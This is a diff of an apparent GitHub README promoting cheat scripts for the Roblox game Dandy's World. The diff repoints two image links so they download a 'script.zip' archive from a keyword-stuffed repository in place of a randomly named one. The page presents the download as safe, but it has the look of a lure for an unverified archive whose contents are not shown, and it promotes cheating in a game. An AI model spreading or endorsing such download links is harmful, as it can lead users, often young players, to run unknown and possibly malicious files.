@@ -5,10 +5,10 @@
 In this ultimate 2025 guide, we’ll cover everything you need to know about **Dandy's World scripts**, from **how they work**, their **key features**, and how to use them, to ensuring your experience remains safe and enjoyable. If you’re interested in taking your **Dandy’s World** gameplay to the next level, this guide is for you!
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![1729764141479-Picsart_24-10-24_17-56-15-436](https://github.com/user-attachments/assets/66d75cf1-dc33-423c-bd32-ec5ebb75059a)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
